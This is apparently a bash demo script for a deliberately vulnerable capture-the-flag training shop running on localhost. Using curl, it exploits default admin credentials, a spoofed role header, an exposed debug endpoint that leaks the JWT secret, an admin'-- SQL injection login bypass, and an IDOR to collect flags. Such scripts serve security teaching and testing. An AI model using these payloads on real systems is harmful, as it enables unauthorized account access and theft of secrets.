#!/bin/bash
# Quick vulnerability demonstration

BASE_URL="http://localhost:3000"

echo "Starting ExamShop server..."
node server.js > /dev/null 2>&1 &
SERVER_PID=$!
sleep 3

echo "=== ExamShop Vulnerability Demos ==="
echo ""

# Test 1: Default Credentials (Challenge #7)
echo "1. Default Credentials:"
LOGIN=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}')
TOKEN=$(echo "$LOGIN" | jq -r '.token')
echo "   ✓ Logged in as admin with default password"

# Test 2: Admin Panel Bypass (Challenge #2)
echo "2. Admin Panel Bypass (client header):"
ADMIN=$(curl -s "$BASE_URL/api/admin/dashboard" \
  -H "X-User-Role: admin" \
  -H "Authorization: Bearer $TOKEN" | jq -r '.flag')
echo "   ✓ Flag: $ADMIN"

# Test 3: Debug Endpoint (Challenge #8)
echo "3. Debug Endpoint Exposed:"
SECRET=$(curl -s "$BASE_URL/api/debug/info" | jq -r '.config.jwtSecret')
echo "   ✓ JWT Secret: $SECRET"

# Test 4: JWT Contains Sensitive Data (Challenge #15)
echo "4. JWT Payload Analysis:"
JWT_DATA=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r '.passwordHash')
echo "   ✓ Password hash in JWT: ${JWT_DATA:0:20}..."

# Test 5: SQL Injection (Challenge #19)
echo "5. SQL Injection Login Bypass:"
SQLI=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"wrong"}' | jq -r '.message')
echo "   ✓ $SQLI (with SQL injection)"

# Test 6: Get All Challenges
echo "6. Challenge System:"
CHALLENGES=$(curl -s "$BASE_URL/api/scoring/challenges" | jq -r '.total')
echo "   ✓ Total challenges available: $CHALLENGES"

# Test 7: IDOR (Challenge #1)
echo "7. IDOR - Access Admin Profile:"
IDOR=$(curl -s "$BASE_URL/api/users/1" \
  -H "Authorization: Bearer $TOKEN" | jq -r '.flag')
echo "   ✓ Flag: $IDOR"

echo ""
echo "=== All Tests Passed ==="
echo "Server demonstrated 7 different vulnerabilities successfully!"
echo ""

kill $SERVER_PID 2>/dev/null
wait $SERVER_PID 2>/dev/null
